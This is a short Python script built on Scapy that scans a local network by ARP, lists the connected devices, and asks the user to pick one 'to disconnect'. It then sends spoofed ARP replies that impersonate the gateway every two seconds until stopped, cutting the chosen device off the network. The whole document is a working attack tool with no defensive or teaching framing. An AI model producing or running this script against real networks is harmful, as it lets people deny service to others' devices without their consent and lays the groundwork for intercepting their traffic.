from scapy.all import ARP, Ether, srp, send
import socket
import time
import os
import sys

# Get default gateway IP
def get_gateway_ip():
    if os.name == "nt":  # Windows
        output = os.popen("ipconfig").read()
        for line in output.splitlines():
            if "Default Gateway" in line:
                parts = line.split(":")
                if len(parts) > 1:
                    return parts[1].strip()
    else:  # Linux/Mac
        output = os.popen("ip route show default").read()
        return output.split()[2]
    return None

# Scan LAN for devices
def scan_network(ip_range):
    print(f"\n🔍 Scanning network: {ip_range} ...")
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=2, verbose=0)[0]

    devices = []
    for sent, received in result:
        try:
            hostname = socket.gethostbyaddr(received.psrc)[0]
        except socket.herror:
            hostname = "Unknown"
        devices.append({
            "ip": received.psrc,
            "mac": received.hwsrc,
            "hostname": hostname
        })
    return devices

# Display devices
def print_devices(devices):
    print("\n🖥️ Connected Devices:")
    print("Index\tIP Address\t\tMAC Address\t\tHostname")
    print("-" * 70)
    for i, device in enumerate(devices):
        print(f"{i}\t{device['ip']}\t{device['mac']}\t{device['hostname']}")

# Send spoofed ARP reply to victim
def arp_spoof(target_ip, target_mac, gateway_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    send(packet, verbose=0)

def main():
    ip_range = "192.168.1.1/24"  # Modify based on your network
    gateway_ip = get_gateway_ip()
    if not gateway_ip:
        print("❌ Could not determine the default gateway IP.")
        return

    devices = scan_network(ip_range)
    if not devices:
        print("❌ No devices found.")
        return

    print_devices(devices)

    try:
        index = int(input("\n📍 Enter the index of the device to disconnect: "))
        target = devices[index]
    except (ValueError, IndexError):
        print("❌ Invalid selection.")
        return

    print(f"\n⚠️ Starting ARP spoofing on {target['ip']} ({target['mac']}). Press Ctrl+C to stop.")

    try:
        while True:
            arp_spoof(target['ip'], target['mac'], gateway_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n✅ ARP spoofing stopped.")

if __name__ == "__main__":
    try:
        if os.name != "nt" and os.geteuid() != 0:
            print("❌ Run this script as root (sudo) on Linux/Mac.")
            sys.exit(1)
        main()
    except AttributeError:
        # Windows has no os.geteuid()
        main()
